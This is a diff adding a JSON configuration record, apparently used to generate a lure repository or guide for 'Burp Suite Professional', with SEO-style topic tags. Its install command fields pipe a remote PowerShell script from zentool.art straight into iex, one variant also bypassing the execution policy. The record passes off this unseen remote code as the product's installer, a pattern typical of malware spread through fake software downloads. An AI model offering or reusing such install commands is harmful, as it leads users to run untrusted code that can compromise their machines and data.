@@ -1,0 +1,27 @@
+{
+  "repo": "Burp-Suite-Professional",
+  "product": "Burp Suite Professional",
+  "product_title": "Burp Suite Pro",
+  "kind": "security",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "pentest",
+  "topics": [
+    "burp-config",
+    "burp-integration",
+    "burp-latest",
+    "security-testing",
+    "web-security",
+    "proxy-tools",
+    "http-proxy",
+    "penetration-testing",
+    "app-security",
+    "burp-suite",
+    "security-research"
+  ],
+  "site": "zentool.art"
+}
